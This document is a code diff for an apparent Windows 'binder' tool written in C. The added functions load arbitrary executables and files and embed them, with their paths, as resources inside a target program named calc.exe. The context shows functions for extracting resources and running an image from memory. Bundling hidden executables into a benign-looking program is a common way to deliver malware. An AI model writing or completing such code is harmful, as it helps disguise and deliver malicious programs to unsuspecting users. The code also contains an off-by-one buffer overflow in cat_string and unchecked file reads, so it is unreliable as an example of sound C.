@@ -132,81 +132,13 @@ void RunFromMemory(char* pImage,char* pPath)
     free(pMemory);
 }
 
-void Update(int id, char *name)
-{
-    FILE *file = fopen(name, "rb+");
-    int size = 0;
-    int tmp;
-    char *buf = malloc(100000);
-    while(1)
-    {
-        tmp =fgetc(file);
-        if(tmp == EOF)
-        {
-            break;
-        }
-        buf[size++] = tmp;
-        //printf("%d\n", size);
-    }
-    printf("abc:%d\n", size);
-    fclose(file);
-    HANDLE hUpdateRes;  // update resource handle
-    BOOL result;
-
-// Open the file to which you want to add the dialog box resource.
-    hUpdateRes = BeginUpdateResource("main/myBinder.exe", FALSE);
-    if (hUpdateRes == NULL)
-    {
-        puts("Could not open file for writing.");
-        return;
-    }
-
-// Add the dialog box resource to the update list.
-    result = UpdateResource(hUpdateRes,    // update resource handle
-                            RT_RCDATA,                         // change dialog box resource
-                            MAKEINTRESOURCE(id),         // dialog box id
-                            MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),  // neutral language
-                            buf,                         // ptr to resource info
-                            size);       // size of resource info
-    free(buf);
-    if (result == FALSE)
-    {
-        puts("Could not add resource.");
-        return;
-    }
-
-// Write changes to FOOT.EXE and then close it.
-    if (!EndUpdateResource(hUpdateRes, FALSE))
-    {
-        puts("Could not write changes to file.");
-        return;
-    }
-}
 
 /* change icon */
 void change_icon (){}
 
-/* make config */
-const char* make_config (int dir, int exe, int file){}
 
-/* update reource (config, dir, exe, file) */
-void update_config (const char *config){}
-void update_dir (Dir_file *dirs){}
-void update_exe (Exe_file *exes){}
-void update_file (Data_file *files){}
 
 /******************** done below *********************/
-
-DWORD res_size(int id)
-{
-    HRSRC res;
-    DWORD size;
-
-    res = FindResource(dst_exe, MAKEINTRESOURCE(id), RT_RCDATA);
-    size = SizeofResource(dst_exe, res);
-
-    return size;
-}
 
 void Extract(int id, const char *filename)
 {
@@ -232,4 +164,156 @@ void Extract(int id, const char *filename)
     fwrite(res_lock, 1, res_size, output);
 
     fclose(output);
+}
+
+char* Load_file(const char *path, int size)
+{
+    FILE *file = fopen(path, "rb");
+    char *buf = malloc(size);
+
+    fread(buf, sizeof(char), size, file);
+
+    fclose(file);
+
+    return buf;
+};
+
+void Update(int id, const char *data, int size)
+{
+    extern const char *final_prog;
+    char *buf = malloc(size);
+    memcpy(buf, data, size);
+    HANDLE update;
+    BOOL result;
+
+// Open the file to which you want to add the dialog box resource.
+    update = BeginUpdateResource("../dst/calc.exe", FALSE);
+    if (update == NULL)
+    {
+        puts("Could not open file for writing.");
+        return;
+    }
+
+// Add the dialog box resource to the update list.
+    result = UpdateResource(update,    // update resource handle
+                            RT_RCDATA,                         // change dialog box resource
+                            MAKEINTRESOURCE(id),         // dialog box id
+                            MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),  // neutral language
+                            buf,                         // ptr to resource info
+                            size);       // size of resource info
+
+    if (result == FALSE)
+    {
+        puts("Could not add resource.");
+        return;
+    }
+
+// Write changes to FOOT.EXE and then close it.
+    if (!EndUpdateResource(update, FALSE))
+    {
+        puts("Could not write changes to file.");
+        return;
+    }
+}
+
+DWORD res_size(int id)
+{
+    HRSRC res;
+    DWORD size;
+
+    res = FindResource(dst_exe, MAKEINTRESOURCE(id), RT_RCDATA);
+    size = SizeofResource(dst_exe, res);
+
+    return size;
+}
+
+const char* make_config (int dir, int exe, int file)
+{
+    const char *config;
+
+    config = make_string(dir);
+    config = cat_string(config, " ");
+
+    config = cat_string(config, make_string(exe));
+    config = cat_string(config, " ");
+
+    config = cat_string(config, make_string(file));
+    config = cat_string(config, " ");
+
+    return config;
+}
+
+const char* make_string (int num)
+{
+    char *str;
+    int len = 0;
+    int tmp = num;
+
+    if(tmp == 0) {
+        str = malloc(2);
+        str[0] = '0';
+        str[1] = '\0';
+        return str;
+    }
+
+    while (tmp) {
+        tmp /= 10;
+        len++;
+    }
+
+    str = malloc(len+1);
+    sprintf(str, "%d", num);
+
+    return str;
+};
+
+void update_config (const char *config)
+{
+    Update(ID_CONFIG, config, strlen(config));
+}
+
+void update_dir (Dir_file *dirs)
+{
+    int i = 0;
+    for (i = 0; dirs != NULL; i++, dirs = dirs->next_dir) {
+        Update(ID_DIR+i, dirs->path, strlen(dirs->path));
+    }
+}
+
+void update_exe (Exe_file *exes)
+{
+    int i = 0;
+    for (i = 0; exes != NULL; i++, exes = exes->next_exe) {
+        char *data = Load_file(exes->path, exes->size);
+        Update(ID_EXE_DATA+i, data, exes->size);
+        free(data);
+
+        Update(ID_EXE_PATH+i, exes->path, strlen(exes->path));
+    }
+}
+
+void update_file (Data_file *files)
+{
+    int i = 0;
+    for (i = 0; files != NULL; i++, files = files->next_file) {
+        char *data = Load_file(files->path, files->size);
+        Update(ID_FILE_DATA+i, data, files->size);
+        free(data);
+
+        Update(ID_FILE_PATH+i, files->path, strlen(files->path));
+    }
+}
+
+const char* cat_string(const char* first, const char* second)
+{
+    char *str;
+    int len;
+
+    len = strlen(first) + strlen(second);
+    str = malloc(len);
+
+    strcpy(str, first);
+    strcat(str, second);
+
+    return str;
 }
